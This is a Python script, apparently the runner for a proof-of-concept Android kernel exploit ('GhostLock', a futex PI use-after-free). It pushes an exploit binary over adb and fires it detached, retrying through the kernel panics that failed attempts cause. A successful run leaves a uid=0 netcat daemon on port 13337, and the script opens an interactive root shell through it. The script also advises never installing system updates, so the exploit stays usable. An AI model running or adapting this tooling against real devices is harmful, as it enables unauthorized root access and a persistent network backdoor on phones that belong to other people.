#!/usr/bin/env python3
"""GhostLock PoC runner - CVE-2026-43499 (futex PI use-after-free)

General runner: no kernel filter. The exploit binary carries the
offsets; you are responsible for pointing --bin at a build that matches
the target kernel (see WRITEUP.md for the porting method).

Run model:
  connect -> wait for adb authorization -> wait for boot ->
  fire detached -> a miss panics the box -> survive the reboot ->
  settle -> re-roll -> a hit leaves a uid=0 root daemon on :13337 ->
  drop into an interactive root shell.

Authorized security research on your own hardware only. Never install
system updates on a target: the current GKI branch HEAD carries the
upstream fix and any kernel OTA ends the exploit permanently.

Stdlib only; adb (and nc for the shell) on PATH.
"""
import argparse
import os
import pty
import socket
import subprocess
import sys
import time

# Reclaim environment (device-proven; see WRITEUP.md "The reclaim
# environment" for what each knob is for).
ENV = ("CRED_ATTEMPTS=6 PREPARE_SLABS=32 MOVABLE_STORM_MB=128 "
       "PCP_DRAIN_BURST=24 PCP_COUNT_DRAIN_MB=8 DRAIN_KILLS=64")

ROOT_PORT = 13337
ROLL_WAIT_S = 8 * 60        # per-roll soft cap
SETTLE_S = 45               # settle between rolls (f2fs after panic)


def adb(*args, timeout=30):
    """Run adb. Never raises: the box may be mid-panic or mid-reboot."""
    try:
        return subprocess.run(["adb", *args], capture_output=True,
                              text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(args, returncode=124)
    except Exception as e:
        return subprocess.CompletedProcess(args, returncode=125)


def shell(host, *cmd, timeout=30):
    return adb("-s", host, "shell", *cmd, timeout=timeout)


def wait_authorized(host):
    """Fresh boots re-show the adb authorization popup; trust does not
    survive reboot on this class of device. Click Allow when it appears."""
    print("waiting for adb authorization (click Allow on the device)...")
    for i in range(240):
        adb("connect", host)
        if adb("-s", host, "get-state").stdout.strip() == "device":
            print("authorized after ~%ds" % (i * 5))
            return True
        time.sleep(5)
    return False


def wait_ready(host):
    for _ in range(120):
        if adb("-s", host, "get-state").stdout.strip() == "device":
            if shell(host, "getprop sys.boot_completed").stdout.strip() == "1":
                up = shell(host, "cut -d. -f1 /proc/uptime").stdout.strip()
                print("boot complete, uptime %ss" % up)
                return True
        time.sleep(5)
    return False


def uptime(host):
    try:
        return int(shell(host, "cut -d. -f1 /proc/uptime",
                         timeout=10).stdout.strip() or -1)
    except Exception:
        return -1


def root_alive(host):
    """Any successful TCP connect to the daemon port means root is live.
    The nc daemon serves ONE connection at a time and re-arms, so a busy
    daemon (connect ok, no data) is ALIVE, not dead. Never fire a second
    exploit instance onto a box that answers on this port."""
    try:
        socket.create_connection((host.split(":")[0], ROOT_PORT),
                                  timeout=4).close()
        return True
    except OSError:
        return False


def fire(host, binpath, extra_env):
    log = "/data/local/tmp/ghostlock.log"
    print("push: %s -> /data/local/tmp/ghostlock" % binpath)
    adb("push", binpath, "/data/local/tmp/ghostlock", timeout=60)
    shell(host, "chmod 755 /data/local/tmp/ghostlock")
    cmd = ("cd /data/local/tmp && rm -f %s && "
           "nohup env %s %s ./ghostlock --cred > %s 2>&1 < /dev/null &"
           % (log, ENV, extra_env, log))
    print("fire (detached): %s" % cmd)
    shell(host, cmd, timeout=15)


def roll(host, binpath, n, extra_env):
    """One exploit attempt. Returns True on hit, False on a miss (which
    is always a fatal panic; the caller survives it and re-rolls)."""
    print()
    print(">>> roll %d (env: %s %s)" % (n, ENV, extra_env))
    fire(host, binpath, extra_env)
    t0 = time.time()
    last_up = uptime(host)
    while time.time() - t0 < ROLL_WAIT_S:
        time.sleep(12)
        if root_alive(host):
            print("ROOT DAEMON ALIVE on :%d after %ds"
                  % (ROOT_PORT, time.time() - t0))
            print(shell(host, "tail -5 /data/local/tmp/ghostlock.log")
                  .stdout.rstrip())
            return True
        up = uptime(host)
        if up < 0 or up < last_up:
            print("panic reboot at ~%ds (miss is fatal); surviving"
                  % (time.time() - t0))
            return False
        last_up = up
        print("[%3ds] uptime=%ds, waiting" % (time.time() - t0, up))
    print("roll timed out after %ds" % ROLL_WAIT_S)
    return False


def verify_root(host):
    """id through the daemon. The daemon re-arms per connection."""
    try:
        s = socket.create_connection((host.split(":")[0], ROOT_PORT),
                                      timeout=10)
        s.sendall(b"id\nuname -r\ngetenforce\n")
        time.sleep(2)
        s.settimeout(8)
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        s.close()
    except OSError as e:
        print("daemon not answering: %s" % e)
        return False
    print(data.decode("utf-8", "replace").rstrip())
    if b"uid=0" not in data:
        print("daemon answered but not uid=0; unexpected")
        return False
    print()
    print("ROOT: uid=0 daemon on %s:%d (re-arms per connection)"
          % (host.split(":")[0], ROOT_PORT))
    print("connect any time:  nc %s %d" % (host.split(":")[0], ROOT_PORT))
    return True


def main():
    p = argparse.ArgumentParser(
        description="GhostLock PoC runner (CVE-2026-43499 futex PI UAF)")
    p.add_argument("--host", required=True,
                   help="adb target host:port (e.g. 192.168.1.50:5555)")
    p.add_argument("--bin", default="ghostlock_r18",
                   help="exploit binary built for the target kernel "
                        "(default: ghostlock_r18)")
    p.add_argument("--rolls", type=int, default=6,
                   help="max exploit attempts (default 6)")
    p.add_argument("--settle", type=int, default=SETTLE_S,
                   help="seconds to settle after each panic reboot "
                        "(default 45)")
    p.add_argument("--env", action="append", default=[],
                   help="extra env for the exploit (repeatable), "
                        "e.g. --env GHOST_SELINUX=0")
    p.add_argument("--no-shell", action="store_true",
                   help="do not drop into the interactive root shell")
    a = p.parse_args()

    if not os.path.exists(a.bin):
        print("missing exploit binary: %s (--bin PATH)" % a.bin)
        sys.exit(3)
    extra_env = " ".join(a.env)

    print()
    print("*" * 70)
    print("  GhostLock PoC - CVE-2026-43499 (futex PI use-after-free)")
    print("  no kernel filter: --bin must match the target kernel")
    print("  authorized research on your own hardware only")
    print("*" * 70)

    adb("connect", a.host)
    if not wait_authorized(a.host):
        print("device never authorized; abort")
        sys.exit(4)
    if not wait_ready(a.host):
        print("device never finished booting; abort")
        sys.exit(4)
    print("kernel: %s" % shell(a.host, "uname -r").stdout.strip())

    if root_alive(a.host):
        print("root daemon already alive: skipping the exploit")
    else:
        for n in range(1, a.rolls + 1):
            if roll(a.host, a.bin, n, extra_env):
                break
            print("roll %d missed; settling %ds" % (n, a.settle))
            time.sleep(a.settle)
            if not wait_authorized(a.host):
                print("device lost authorization mid-run; abort")
                sys.exit(4)
            if not wait_ready(a.host):
                print("device never came back; abort")
                sys.exit(4)
        if not root_alive(a.host):
            print("FAILED: no root after %d rolls" % a.rolls)
            sys.exit(2)

    if not verify_root(a.host):
        sys.exit(2)

    if a.no_shell:
        print("(--no-shell: daemon stays up; nc %s %d to return)"
              % (a.host.split(":")[0], ROOT_PORT))
        return
    print()
    print("interactive root shell: nc %s %d (type exit to leave; the"
          % (a.host.split(":")[0], ROOT_PORT))
    print("daemon re-arms, you can always reconnect)")
    print()
    pty.spawn(["nc", a.host.split(":")[0], str(ROOT_PORT)])


if __name__ == "__main__":
    main()